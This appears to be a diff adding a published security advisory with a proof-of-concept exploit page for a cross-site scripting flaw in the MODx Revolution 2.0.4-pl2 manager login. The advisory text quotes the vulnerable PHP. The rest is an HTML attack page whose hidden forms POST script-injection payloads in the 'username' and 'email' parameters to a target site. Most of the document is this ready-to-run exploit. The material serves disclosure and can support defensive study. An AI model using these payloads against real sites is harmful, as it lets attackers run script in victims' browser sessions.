@@ -1,0 +1,191 @@
+<!--
+
+ Title: MODx Revolution CMS 2.0.4-pl2 Remote XSS POST Injection Vulnerability
+
+
+ Vendor: MODx, LLC.
+ Product web page: http://www.modxcms.com
+ Affected version: 2.0.4-pl2 (public launch 2)
+
+ Summary: MODx Revolution is a powerful PHP Content Management Framework that plays nicely
+ with custom code and helps you build sites faster and maintain them with ease. With Revolution
+ you'll leverage the best things to come around since MVC and Active Record.
+
+ Desc: The MODx Revolution CMS suffers from a XSS vulnerability when parsing user input to
+ the "username" and "email" parameters via POST method in login.php script at the manager
+ login interface. Attackers can exploit this weakness to execute arbitrary HTML and script
+ code in a user's browser session.
+
+
+ #############################################################
+ -------------------------------------------------------------
+ /var/html/www/manager/controllers/default/security/login.php:
+ -------------------------------------------------------------
+
+ 25:   /* handle login */
+ 26:   if (!empty($_POST['login'])) {
+ 27:       $validated = true;
+ 28:
+ 29:       $user = $modx->getObject('modUser',array(
+ 30:           'username' => $_POST['username'],
+ 31:       ));
+
+ ...
+
+ 71:   } else if (!empty($_POST['forgotlogin'])) {
+ 72:       $c = $modx->newQuery('modUser');
+ 73:       $c->select(array('modUser.*','Profile.email','Profile.fullname'));
+ 74:       $c->innerJoin('modUserProfile','Profile');
+ 75:       $c->where(array(
+ 76:           'Profile.email' => $_POST['email'],
+ 77:       ));
+
+ -------------------------------------------------------------
+
+
+ Tested on: Fedora 10 (Cambridge)
+            Apache 2.2.14
+            PHP 5.2.10
+            MySQL 5.0.88
+
+ Vulnerability discovered by: Gjoko 'LiquidWorm' Krstic
+                              liquidworm gmail com
+                              Zero Science Lab - http://www.zeroscience.mk
+
+ Advisory ID: ZSL-2010-4982
+ Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4982.php
+ Vendor Advisory URL: http://bugs.modx.com/issues/2918
+
+ 05.12.2010
+
+
+ PoC:
+
+-->
+
+
+<html>
+<head>
+
+<title>MODx Revolution CMS Cross-Site Scripting (XSS) Proof Of Concept Script</title>
+<link rel="Shortcut Icon" href="http://www.zeroscience.mk/favicon.ico" type="image/x-icon">
+
+</head>
+
+<body background="http://a1.twimg.com/profile_background_images/135331344/twzslbg.jpg">
+
+<br /><br /><center><font color="gray">
+<h3><strong>MODx Revolution CMS 2.0.4-pl2 Remote XSS PoC (POST Method)<strong></h3>
+</font></center>
+
+<script type="text/javascript">
+
+function zsl_user()
+{
+  document.forms["modx-login-form"].submit();
+}
+
+function zsl_mail()
+{
+  document.forms["modx-fl-form"].submit();
+}
+
+</script>
+
+<div id="The Form Of The Ninja" style="visibility:hidden">
+
+<form
+action       = "http://example.com/manager/"
+id           = "modx-login-form"
+enctype      = "application/x-www-form-urlencoded"
+name         = "hack"
+method       = "post"
+>
+
+<input
+type         = "hidden"
+name         = "login_context"
+value        = "mgr"
+/>
+
+<input
+type         = "hidden"
+name         = "modahsh"
+value        = ""
+/>
+
+<input
+type         = "hidden"
+name         = "returnUrl"
+value        = "/manager/"
+/>
+
+<input
+type         = "text"
+id           = "modx-login-username"
+name         = "username"
+tabindex     = "1"
+autocomplete = "on"
+class        = "x-form-text x-form-field"
+value        = '"><script>alert("username param XSSed!")</script>'
+/>
+
+<input
+type         = "password"
+id           = "modx-login-password"
+name         = "password"
+tabindex     = "2"
+autocomplete = "on"
+class        = "x-form-text x-form-field"
+/>
+
+<input
+type         = "checkbox"
+id           = "modx-login-rememberme"
+name         = "rememberme"
+tabindex     = "3"
+autocomplete = "on"
+checked      = "checked"
+class        = "x-form-checkbox x-form-field"
+value        = "1"
+/>
+
+<input
+type         = "hidden"
+name         = "login"
+value        = "1"
+/>
+
+</div>
+
+<br /><br />
+<a href="javascript: zsl_user();" style="text-decoration:none"><b>
+<font color="red"><center><h3>1. Exploit "username" parameter!
+<h3></font></b></a></center></form>
+
+<div id="The Form Of The 2nd Ninja" style="visibility:hidden">
+
+<form 
+action       = "http://example.com/manager/"
+id           = "modx-fl-form"
+enctype      = "application/x-www-form-urlencoded"
+name         = "hack"
+method       = "post"
+>
+
+<input
+type         = "text"
+id           = "modx-login-email"
+name         = "email"
+class        = "x-form-text x-form-field"
+value        = '"><script>alert("email param XSSed!")</script>"'
+/>
+
+</div>
+
+<a href="javascript: zsl_mail();" style="text-decoration:none"><b>
+<font color="red"><center><h3>2. Exploit "email" parameter!
+<h3></font></b></a></center></form>
+
+</body>
+</html>
